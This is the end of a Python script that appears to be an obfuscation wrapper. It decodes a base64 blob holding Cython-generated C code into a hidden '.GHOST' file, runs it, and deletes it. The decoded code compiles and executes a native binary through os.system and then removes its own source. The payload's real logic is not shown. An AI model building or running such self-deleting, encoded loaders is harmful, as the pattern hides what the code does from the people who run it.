MTDsKICAgICAgICBpZiAoZm91bmQgJiYgZm91bmQtPmlkID09IGludGVycHJldGVyX2lkKSB7CiAgICAgICAgICAgIHJlc3VsdCA9IGZvdW5kLT5tb2R1bGU7CiAgICAgICAgfQojaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUKICAgICAgICBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpOwojZW5kaWYKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQp9CiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQpzdGF0aWMgdm9pZCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF93YWl0X3VudGlsX25vX3JlYWRlcnModm9pZCkgewogICAgd2hpbGUgKF9fcHl4X2F0b21pY19sb2FkKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpICE9IDApOwp9CiNlbHNlCiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfd2FpdF91bnRpbF9ub19yZWFkZXJzKCkKI2VuZGlmCnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfQWRkTW9kdWxlSW50ZXJwSWRBc0luZGV4KF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKm9sZF9kYXRhLCBQeU9iamVjdCogbW9kdWxlLCBpbnQ2NF90IGludGVycHJldGVyX2lkKSB7CiAgICBQeV9zc2l6ZV90IHRvX2FsbG9jYXRlID0gKCpvbGRfZGF0YSktPmFsbG9jYXRlZDsKICAgIHdoaWxlICh0b19hbGxvY2F0ZSA8PSBpbnRlcnByZXRlcl9pZCkgewogICAgICAgIGlmICh0b19hbGxvY2F0ZSA9PSAwKSB0b19hbGxvY2F0ZSA9IDE7CiAgICAgICAgZWxzZSB0b19hbGxvY2F0ZSAqPSAyOwogICAgfQogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICpuZXdfZGF0YSA9ICpvbGRfZGF0YTsKICAgIGlmICh0b19hbGxvY2F0ZSAhPSAoKm9sZF9kYXRhKS0+YWxsb2NhdGVkKSB7CiAgICAgICAgIG5ld19kYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKXJlYWxsb2MoCiAgICAgICAgICAgICpvbGRfZGF0YSwKICAgICAgICAgICAgc2l6ZW9mKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSkrKHRvX2FsbG9jYXRlLTEpKnNpemVvZihfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKSk7CiAgICAgICAgaWYgKCFuZXdfZGF0YSkgewogICAgICAgICAgICBQeUVycl9Ob01lbW9yeSgpOwogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgfQogICAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gbmV3X2RhdGEtPmFsbG9jYXRlZDsgaSA8IHRvX2FsbG9jYXRlOyArK2kpIHsKICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlW2ldLmlkID0gaTsKICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlW2ldLm1vZHVsZSA9IE5VTEw7CiAgICAgICAgfQogICAgICAgIG5ld19kYXRhLT5hbGxvY2F0ZWQgPSB0b19hbGxvY2F0ZTsKICAgIH0KICAgIG5ld19kYXRhLT50YWJsZVtpbnRlcnByZXRlcl9pZF0ubW9kdWxlID0gbW9kdWxlOwogICAgaWYgKG5ld19kYXRhLT5jb3VudCA8IGludGVycHJldGVyX2lkKzEpIHsKICAgICAgICBuZXdfZGF0YS0+Y291bnQgPSBpbnRlcnByZXRlcl9pZCsxOwogICAgfQogICAgKm9sZF9kYXRhID0gbmV3X2RhdGE7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgdm9pZCBfX1B5eF9TdGF0ZV9Db252ZXJ0RnJvbUludGVycElkQXNJbmRleChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKmRhdGEpIHsKICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgKnJlYWQgPSBkYXRhLT50YWJsZTsKICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgKndyaXRlID0gZGF0YS0+dGFibGU7CiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlICplbmQgPSByZWFkICsgZGF0YS0+Y291bnQ7CiAgICBmb3IgKDsgcmVhZDxlbmQ7ICsrcmVhZCkgewogICAgICAgIGlmIChyZWFkLT5tb2R1bGUpIHsKICAgICAgICAgICAgd3JpdGUtPmlkID0gcmVhZC0+aWQ7CiAgICAgICAgICAgIHdyaXRlLT5tb2R1bGUgPSByZWFkLT5tb2R1bGU7CiAgICAgICAgICAgICsrd3JpdGU7CiAgICAgICAgfQogICAgfQogICAgZGF0YS0+Y291bnQgPSB3cml0ZSAtIGRhdGEtPnRhYmxlOwogICAgZm9yICg7IHdyaXRlPGVuZDsgKyt3cml0ZSkgewogICAgICAgIHdyaXRlLT5pZCA9IDA7CiAgICAgICAgd3JpdGUtPm1vZHVsZSA9IE5VTEw7CiAgICB9CiAgICBkYXRhLT5pbnRlcnByZXRlcl9pZF9hc19pbmRleCA9IDA7Cn0Kc3RhdGljIGludCBfX1B5eF9TdGF0ZV9BZGRNb2R1bGUoUHlPYmplY3QqIG1vZHVsZSwgQ1lUSE9OX1VOVVNFRCB2b2lkKiBkdW1teSkgewogICAgaW50NjRfdCBpbnRlcnByZXRlcl9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChfX1B5eF9QeUludGVycHJldGVyU3RhdGVfR2V0KCkpOwogICAgaWYgKGludGVycHJldGVyX2lkID09IC0xKSByZXR1cm4gLTE7CiAgICBpbnQgcmVzdWx0ID0gMDsKICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKTsKI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKm9sZF9kYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKQogICAgICAgICAgICBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSwgMCk7CiNlbHNlCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKm9sZF9kYXRhID0gX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YTsKI2VuZGlmCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKm5ld19kYXRhID0gb2xkX2RhdGE7CiAgICBpZiAoIW5ld19kYXRhKSB7CiAgICAgICAgbmV3X2RhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICopY2FsbG9jKDEsIHNpemVvZihfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEpKTsKICAgICAgICBpZiAoIW5ld19kYXRhKSB7CiAgICAgICAgICAgIHJlc3VsdCA9IC0xOwogICAgICAgICAgICBQeUVycl9Ob01lbW9yeSgpOwogICAgICAgICAgICBnb3RvIGVuZDsKICAgICAgICB9CiAgICAgICAgbmV3X2RhdGEtPmFsbG9jYXRlZCA9IDE7CiAgICAgICAgbmV3X2RhdGEtPmludGVycHJldGVyX2lkX2FzX2luZGV4ID0gMTsKICAgIH0KICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3dhaXRfdW50aWxfbm9fcmVhZGVycygpOwogICAgaWYgKG5ld19kYXRhLT5pbnRlcnByZXRlcl9pZF9hc19pbmRleCkgewogICAgICAgIGlmIChpbnRlcnByZXRlcl9pZCA8IF9fUFlYX01PRFVMRV9TVEFURV9MT09LVVBfU01BTExfU0laRSkgewogICAgICAgICAgICByZXN1bHQgPSBfX1B5eF9TdGF0ZV9BZGRNb2R1bGVJbnRlcnBJZEFzSW5kZXgoJm5ld19kYXRhLCBtb2R1bGUsIGludGVycHJldGVyX2lkKTsKICAgICAgICAgICAgZ290byBlbmQ7CiAgICAgICAgfQogICAgICAgIF9fUHl4X1N0YXRlX0NvbnZlcnRGcm9tSW50ZXJwSWRBc0luZGV4KG5ld19kYXRhKTsKICAgIH0KICAgIHsKICAgICAgICBQeV9zc2l6ZV90IGluc2VydF9hdCA9IDA7CiAgICAgICAgewogICAgICAgICAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBsb3dlcl9ib3VuZCA9IF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGVTdGF0ZUxvb2t1cFRhYmxlTG93ZXJCb3VuZCgKICAgICAgICAgICAgICAgIG5ld19kYXRhLT50YWJsZSwgbmV3X2RhdGEtPmNvdW50LCBpbnRlcnByZXRlcl9pZCk7CiAgICAgICAgICAgIGFzc2VydChsb3dlcl9ib3VuZCk7CiAgICAgICAgICAgIGluc2VydF9hdCA9IGxvd2VyX2JvdW5kIC0gbmV3X2RhdGEtPnRhYmxlOwogICAgICAgICAgICBpZiAodW5saWtlbHkoaW5zZXJ0X2F0IDwgbmV3X2RhdGEtPmNvdW50ICYmIGxvd2VyX2JvdW5kLT5pZCA9PSBpbnRlcnByZXRlcl9pZCkpIHsKICAgICAgICAgICAgICAgIGxvd2VyX2JvdW5kLT5tb2R1bGUgPSBtb2R1bGU7CiAgICAgICAgICAgICAgICBnb3RvIGVuZDsgIC8vIGFscmVhZHkgaW4gdGFibGUsIG5vdGhpbmcgbW9yZSB0byBkbwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChuZXdfZGF0YS0+Y291bnQrMSA+PSBuZXdfZGF0YS0+YWxsb2NhdGVkKSB7CiAgICAgICAgICAgIFB5X3NzaXplX3QgdG9fYWxsb2NhdGUgPSAobmV3X2RhdGEtPmNvdW50KzEpKjI7CiAgICAgICAgICAgIG5ld19kYXRhID0KICAgICAgICAgICAgICAgIChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqKXJlYWxsb2MoCiAgICAgICAgICAgICAgICAgICAgbmV3X2RhdGEsCiAgICAgICAgICAgICAgICAgICAgc2l6ZW9mKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSkgKwogICAgICAgICAgICAgICAgICAgICh0b19hbGxvY2F0ZS0xKSpzaXplb2YoX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSkpOwogICAgICAgICAgICBpZiAoIW5ld19kYXRhKSB7CiAgICAgICAgICAgICAgICByZXN1bHQgPSAtMTsKICAgICAgICAgICAgICAgIG5ld19kYXRhID0gb2xkX2RhdGE7CiAgICAgICAgICAgICAgICBQeUVycl9Ob01lbW9yeSgpOwogICAgICAgICAgICAgICAgZ290byBlbmQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgbmV3X2RhdGEtPmFsbG9jYXRlZCA9IHRvX2FsbG9jYXRlOwogICAgICAgIH0KICAgICAgICArK25ld19kYXRhLT5jb3VudDsKICAgICAgICBpbnQ2NF90IGxhc3RfaWQgPSBpbnRlcnByZXRlcl9pZDsKICAgICAgICBQeU9iamVjdCAqbGFzdF9tb2R1bGUgPSBtb2R1bGU7CiAgICAgICAgZm9yIChQeV9zc2l6ZV90IGk9aW5zZXJ0X2F0OyBpPG5ld19kYXRhLT5jb3VudDsgKytpKSB7CiAgICAgICAgICAgIGludDY0X3QgY3VycmVudF9pZCA9IG5ld19kYXRhLT50YWJsZVtpXS5pZDsKICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlW2ldLmlkID0gbGFzdF9pZDsKICAgICAgICAgICAgbGFzdF9pZCA9IGN1cnJlbnRfaWQ7CiAgICAgICAgICAgIFB5T2JqZWN0ICpjdXJyZW50X21vZHVsZSA9IG5ld19kYXRhLT50YWJsZVtpXS5tb2R1bGU7CiAgICAgICAgICAgIG5ld19kYXRhLT50YWJsZVtpXS5tb2R1bGUgPSBsYXN0X21vZHVsZTsKICAgICAgICAgICAgbGFzdF9tb2R1bGUgPSBjdXJyZW50X21vZHVsZTsKICAgICAgICB9CiAgICB9CiAgZW5kOgojaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUKICAgIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhLCBuZXdfZGF0YSk7CiNlbHNlCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhID0gbmV3X2RhdGE7CiNlbmRpZgogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfUmVtb3ZlTW9kdWxlKENZVEhPTl9VTlVTRUQgdm9pZCogZHVtbXkpIHsKICAgIGludDY0X3QgaW50ZXJwcmV0ZXJfaWQgPSBQeUludGVycHJldGVyU3RhdGVfR2V0SUQoX19QeXhfUHlJbnRlcnByZXRlclN0YXRlX0dldCgpKTsKICAgIGlmIChpbnRlcnByZXRlcl9pZCA9PSAtMSkgcmV0dXJuIC0xOwogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpOwojaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUKICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKikKICAgICAgICAgICAgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEsIDApOwojZWxzZQogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICpkYXRhID0gX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YTsKI2VuZGlmCiAgICBpZiAoZGF0YS0+aW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXgpIHsKICAgICAgICBpZiAoaW50ZXJwcmV0ZXJfaWQgPCBkYXRhLT5jb3VudCkgewogICAgICAgICAgICBkYXRhLT50YWJsZVtpbnRlcnByZXRlcl9pZF0ubW9kdWxlID0gTlVMTDsKICAgICAgICB9CiAgICAgICAgZ290byBkb25lOwogICAgfQogICAgewogICAgICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3dhaXRfdW50aWxfbm9fcmVhZGVycygpOwogICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGxvd2VyX2JvdW5kID0gX19QeXhfU3RhdGVfRmluZE1vZHVsZVN0YXRlTG9va3VwVGFibGVMb3dlckJvdW5kKAogICAgICAgICAgICBkYXRhLT50YWJsZSwgZGF0YS0+Y291bnQsIGludGVycHJldGVyX2lkKTsKICAgICAgICBpZiAoIWxvd2VyX2JvdW5kKSBnb3RvIGRvbmU7CiAgICAgICAgaWYgKGxvd2VyX2JvdW5kLT5pZCAhPSBpbnRlcnByZXRlcl9pZCkgZ290byBkb25lOwogICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgKmVuZCA9IGRhdGEtPnRhYmxlK2RhdGEtPmNvdW50OwogICAgICAgIGZvciAoO2xvd2VyX2JvdW5kPGVuZC0xOyArK2xvd2VyX2JvdW5kKSB7CiAgICAgICAgICAgIGxvd2VyX2JvdW5kLT5pZCA9IChsb3dlcl9ib3VuZCsxKS0+aWQ7CiAgICAgICAgICAgIGxvd2VyX2JvdW5kLT5tb2R1bGUgPSAobG93ZXJfYm91bmQrMSktPm1vZHVsZTsKICAgICAgICB9CiAgICB9CiAgICAtLWRhdGEtPmNvdW50OwogICAgaWYgKGRhdGEtPmNvdW50ID09IDApIHsKICAgICAgICBmcmVlKGRhdGEpOwogICAgICAgIGRhdGEgPSBOVUxMOwogICAgfQogIGRvbmU6CiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQogICAgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEsIGRhdGEpOwojZWxzZQogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSA9IGRhdGE7CiNlbmRpZgogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCk7CiAgICByZXR1cm4gMDsKfQojZW5kaWYKCgojaWZkZWYgX01TQ19WRVIKI3ByYWdtYSB3YXJuaW5nKCBwb3AgKQojZW5kaWYKCgoKCiNlbmRpZiAKCiNpZmRlZiBfX0ZyZWVCU0RfXwojaW5jbHVkZSA8ZGVkZS5oPgojZW5kaWYKI2lmIFBZX01BSk9SX1ZFUlNJT04gPCAzCmludCBtYWluKGludCBhcmdjLCBjaGFyKiogYXJndikgewojZWxpZiBkZWZpbmVkKFdpbjMyKSB8fCBkZWZpbmVkKE1TX1dJTkRPV1MpCmludCB3bWFpbihpbnQgYXJnYywgd2NoYXJfdCAqKmFyZ3YpIHsKI2Vsc2UKc3RhdGljIGludCBfX1B5eF9tYWluKGludCBhcmdjLCB3Y2hhcl90ICoqYXJndikgewojZW5kaWYKI2lmZGVmIF9fRnJlZUJTRF9fCiAgICBmcF9leGNlcHRfdCBtOwogICAgbSA9IGZwZ2V0bWFzaygpOwogICAgZnBzZXRtYXNrKG0gJiB+RlBfWF9PRkwpOwojZW5kaWYKICAgIGlmIChhcmdjICYmIGFyZ3YpCiAgICAgICAgUHlfU2V0UHJvZ3JhbU5hbWUoYXJndlswXSk7CiAgICBQeV9Jbml0aWFsaXplKCk7CiAgICBpZiAoYXJnYyAmJiBhcmd2KQogICAgICAgIFB5U3lzX1NldEFyZ3YoYXJnYywgYXJndik7CiAgICB7CiAgICAgIFB5T2JqZWN0KiBtID0gTlVMTDsKICAgICAgX19weXhfbW9kdWxlX2lzX21haW5fYXcgPSAxOwogICAgICAjaWYgUFlfTUFKT1JfVkVSU0lPTiA8IDMKICAgICAgICAgIGluaXRhdygpOwogICAgICAjZWxpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKICAgICAgICAgIG0gPSBQeUluaXRfYXcoKTsKICAgICAgICAgIGlmICghUHlNb2R1bGVfQ2hlY2sobSkpIHsKICAgICAgICAgICAgICBQeU1vZHVsZURlZiAqbWRlZiA9IChQeU1vZHVsZURlZiAqKSBtOwogICAgICAgICAgICAgIFB5T2JqZWN0ICptb2RuYW1lID0gUHlVbmljb2RlX0Zyb21TdHJpbmcoIl9fbWFpbl9fIik7CiAgICAgICAgICAgICAgbSA9IE5VTEw7CiAgICAgICAgICAgICAgaWYgKG1vZG5hbWUpIHsKICAgICAgICAgICAgICAgICAgbSA9IFB5TW9kdWxlX05ld09iamVjdChtb2RuYW1lKTsKICAgICAgICAgICAgICAgICAgUHlfREVDUkVGKG1vZG5hbWUpOwogICAgICAgICAgICAgICAgICBpZiAobSkgUHlNb2R1bGVfRXhlY0RlZihtLCBtZGVmKTsKICAgICAgICAgICAgICB9CiAgICAgICAgICB9CiAgICAgICNlbHNlCiAgICAgICAgICBtID0gUHlJbml0X2F3KCk7CiAgICAgICNlbmRpZgogICAgICBpZiAoUHlFcnJfT2NjdXJyZWQoKSkgewogICAgICAgICAgUHlFcnJfUHJpbnQoKTsKICAgICAgICAgICNpZiBQWV9NQUpPUl9WRVJTSU9OIDwgMwogICAgICAgICAgaWYgKFB5X0ZsdXNoTGluZSgpKSBQeUVycl9DbGVhcigpOwogICAgICAgICAgI2VuZGlmCiAgICAgICAgICByZXR1cm4gMTsKICAgICAgfQogICAgICBQeV9YREVDUkVGKG0pOwogICAgfQojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDYwMDAwCiAgICBQeV9GaW5hbGl6ZSgpOwojZWxzZQogICAgaWYgKFB5X0ZpbmFsaXplRXgoKSA8IDApCiAgICAgICAgcmV0dXJuIDI7CiNlbmRpZgogICAgcmV0dXJuIDA7Cn0KI2lmIFBZX01BSk9SX1ZFUlNJT04gPj0gMyAmJiAhZGVmaW5lZChXaW4zMikgJiYgIWRlZmluZWQoTVNfV0lORE9XUykKI2luY2x1ZGUgPGxvY2FsZS5oPgpzdGF0aWMgd2NoYXJfdCoKX19QeXhfY2hhcjJ3Y2hhcihjaGFyKiBhcmcpCnsKICAgIHdjaGFyX3QgKnJlczsKI2lmZGVmIEhBVkVfQlJPS0VOX01CU1RPV0NTCiAgICBzaXplX3QgYXJnc2l6ZSA9IHN0cmxlbihhcmcpOwojZWxzZQogICAgc2l6ZV90IGFyZ3NpemUgPSBtYnN0b3djcyhOVUxMLCBhcmcsIDApOwojZW5kaWYKICAgIHNpemVfdCBjb3VudDsKICAgIHVuc2lnbmVkIGNoYXIgKmluOwogICAgd2NoYXJfdCAqb3V0OwojaWZkZWYgSEFWRV9NQlJUT1dDCiAgICBtYnN0YXRlX3QgbWJzOwojZW5kaWYKICAgIGlmIChhcmdzaXplICE9IChzaXplX3QpLTEpIHsKICAgICAgICByZXMgPSAod2NoYXJfdCAqKW1hbGxvYygoYXJnc2l6ZSsxKSpzaXplb2Yod2NoYXJfdCkpOwogICAgICAgIGlmICghcmVzKQogICAgICAgICAgICBnb3RvIG9vbTsKICAgICAgICBjb3VudCA9IG1ic3Rvd2NzKHJlcywgYXJnLCBhcmdzaXplKzEpOwogICAgICAgIGlmIChjb3VudCAhPSAoc2l6ZV90KS0xKSB7CiAgICAgICAgICAgIHdjaGFyX3QgKnRtcDsKICAgICAgICAgICAgZm9yICh0bXAgPSByZXM7ICp0bXAgIT0gMCAmJgogICAgICAgICAgICAgICAgICAgICAoKnRtcCA8IDB4ZDgwMCB8fCAqdG1wID4gMHhkZmZmKTsgdG1wKyspCiAgICAgICAgICAgICAgICA7CiAgICAgICAgICAgIGlmICgqdG1wID09IDApCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzOwogICAgICAgIH0KICAgICAgICBmcmVlKHJlcyk7CiAgICB9CiNpZmRlZiBIQVZFX01CUlRPV0MKICAgIGFyZ3NpemUgPSBzdHJsZW4oYXJnKSArIDE7CiAgICByZXMgPSAod2NoYXJfdCAqKW1hbGxvYyhhcmdzaXplKnNpemVvZih3Y2hhcl90KSk7CiAgICBpZiAoIXJlcykgZ290byBvb207CiAgICBpbiA9ICh1bnNpZ25lZCBjaGFyKilhcmc7CiAgICBvdXQgPSByZXM7CiAgICBtZW1zZXQoJm1icywgMCwgc2l6ZW9mIG1icyk7CiAgICB3aGlsZSAoYXJnc2l6ZSkgewogICAgICAgIHNpemVfdCBjb252ZXJ0ZWQgPSBtYnJ0b3djKG91dCwgKGNoYXIqKWluLCBhcmdzaXplLCAmbWJzKTsKICAgICAgICBpZiAoY29udmVydGVkID09IDApCiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGlmIChjb252ZXJ0ZWQgPT0gKHNpemVfdCktMikgewogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgInVuZXhwZWN0ZWQgbWJydG93YyByZXN1bHQgLTIiKTsKICAgICAgICAgICAgZnJlZShyZXMpOwogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICB9CiAgICAgICAgaWYgKGNvbnZlcnRlZCA9PSAoc2l6ZV90KS0xKSB7CiAgICAgICAgICAgICpvdXQrKyA9IDB4ZGMwMCArICppbisrOwogICAgICAgICAgICBhcmdzaXplLS07CiAgICAgICAgICAgIG1lbXNldCgmbWJzLCAwLCBzaXplb2YgbWJzKTsKICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgfQogICAgICAgIGlmICgqb3V0ID49IDB4ZDgwMCAmJiAqb3V0IDw9IDB4ZGZmZikgewogICAgICAgICAgICBhcmdzaXplIC09IGNvbnZlcnRlZDsKICAgICAgICAgICAgd2hpbGUgKGNvbnZlcnRlZC0tKQogICAgICAgICAgICAgICAgKm91dCsrID0gMHhkYzAwICsgKmluKys7CiAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgIH0KICAgICAgICBpbiArPSBjb252ZXJ0ZWQ7CiAgICAgICAgYXJnc2l6ZSAtPSBjb252ZXJ0ZWQ7CiAgICAgICAgb3V0Kys7CiAgICB9CiNlbHNlCiAgICByZXMgPSAod2NoYXJfdCAqKW1hbGxvYygoc3RybGVuKGFyZykrMSkqc2l6ZW9mKHdjaGFyX3QpKTsKICAgIGlmICghcmVzKSBnb3RvIG9vbTsKICAgIGluID0gKHVuc2lnbmVkIGNoYXIqKWFyZzsKICAgIG91dCA9IHJlczsKICAgIHdoaWxlKCppbikKICAgICAgICBpZigqaW4gPCAxMjgpCiAgICAgICAgICAgICpvdXQrKyA9ICppbisrOwogICAgICAgIGVsc2UKICAgICAgICAgICAgKm91dCsrID0gMHhkYzAwICsgKmluKys7CiAgICAqb3V0ID0gMDsKI2VuZGlmCiAgICByZXR1cm4gcmVzOwpvb206CiAgICBmcHJpbnRmKHN0ZGVyciwgIm91dCBvZiBtZW1vcnkiKTsKICAgIHJldHVybiBOVUxMOwp9CmludAptYWluKGludCBhcmdjLCBjaGFyICoqYXJndikKewogICAgaWYgKCFhcmdjKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X21haW4oMCwgTlVMTCk7CiAgICB9CiAgICBlbHNlIHsKICAgICAgICBpbnQgaSwgcmVzOwogICAgICAgIHdjaGFyX3QgKiphcmd2X2NvcHkgPSAod2NoYXJfdCAqKiltYWxsb2Moc2l6ZW9mKHdjaGFyX3QqKSphcmdjKTsKICAgICAgICB3Y2hhcl90ICoqYXJndl9jb3B5MiA9ICh3Y2hhcl90ICoqKW1hbGxvYyhzaXplb2Yod2NoYXJfdCopKmFyZ2MpOwogICAgICAgIGNoYXIgKm9sZGxvYyA9IHN0cmR1cChzZXRsb2NhbGUoTENfQUxMLCBOVUxMKSk7CiAgICAgICAgaWYgKCFhcmd2X2NvcHkgfHwgIWFyZ3ZfY29weTIgfHwgIW9sZGxvYykgewogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIm91dCBvZiBtZW1vcnkiKTsKICAgICAgICAgICAgZnJlZShhcmd2X2NvcHkpOwogICAgICAgICAgICBmcmVlKGFyZ3ZfY29weTIpOwogICAgICAgICAgICBmcmVlKG9sZGxvYyk7CiAgICAgICAgICAgIHJldHVybiAxOwogICAgICAgIH0KICAgICAgICByZXMgPSAwOwogICAgICAgIHNldGxvY2FsZShMQ19BTEwsICIiKTsKICAgICAgICBmb3IgKGkgPSAwOyBpIDwgYXJnYzsgaSsrKSB7CiAgICAgICAgICAgIGFyZ3ZfY29weTJbaV0gPSBhcmd2X2NvcHlbaV0gPSBfX1B5eF9jaGFyMndjaGFyKGFyZ3ZbaV0pOwogICAgICAgICAgICBpZiAoIWFyZ3ZfY29weVtpXSkgcmVzID0gMTsKICAgICAgICB9CiAgICAgICAgc2V0bG9jYWxlKExDX0FMTCwgb2xkbG9jKTsKICAgICAgICBmcmVlKG9sZGxvYyk7CiAgICAgICAgaWYgKHJlcyA9PSAwKQogICAgICAgICAgICByZXMgPSBfX1B5eF9tYWluKGFyZ2MsIGFyZ3ZfY29weSk7CiAgICAgICAgZm9yIChpID0gMDsgaSA8IGFyZ2M7IGkrKykgewojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDUwMDAwCiAgICAgICAgICAgIGZyZWUoYXJndl9jb3B5MltpXSk7CiNlbHNlCiAgICAgICAgICAgIFB5TWVtX1Jhd0ZyZWUoYXJndl9jb3B5MltpXSk7CiNlbmRpZgogICAgICAgIH0KICAgICAgICBmcmVlKGFyZ3ZfY29weSk7CiAgICAgICAgZnJlZShhcmd2X2NvcHkyKTsKICAgICAgICByZXR1cm4gcmVzOwogICAgfQp9CiNlbmRpZgoiIiIKCkNfRklMRSA9IntuYW1lMl9iYXNlfS5jIgpQWVRIT05fVkVSU0lPTiA9ICIuIi5qb2luKHN5cy52ZXJzaW9uLnNwbGl0KCIgIilbMF0uc3BsaXQoIi4iKVs6LTFdKQpDT01QSUxFX0ZJTEUgPSAoJ2djYyAtSScgKyBQUkVGSVggKyAnL2luY2x1ZGUvcHl0aG9uJyArIFBZVEhPTl9WRVJTSU9OICsgJyAtbyAnICsgRVhFQ1VURV9GSUxFICsgJyAnICsgQ19GSUxFICsgJyAtTCcgKyBQUkVGSVggKyAnL2xpYiAtbHB5dGhvbicgKyBQWVRIT05fVkVSU0lPTikKd2l0aCBvcGVuKENfRklMRSwndycpIGFzIGY6CiAgICBmLndyaXRlKENfU09VUkNFKQpvcy5tYWtlZGlycyhvcy5wYXRoLmRpcm5hbWUoRVhFQ1VURV9GSUxFKSxleGlzdF9vaz1UcnVlKQpvcy5zeXN0ZW0oRVhQT1JUX1BZVEhPTkhPTUUgKyImJiIrIEVYUE9SVF9QWVRIT05fRVhFQ1VUQUJMRSArIiYmIiArIENPTVBJTEVfRklMRSArIiYmIisgUlVOKQpvcy5yZW1vdmUoQ19GSUxFKQ=='
try:
    with open('.GHOST','wb') as D:
        D.write(base64.b64decode(GHOST))
    os.system('python3 .GHOST')
except Exception as E:
    print(E)
finally:
    if os.path.exists('.GHOST'):
        os.remove('.GHOST')
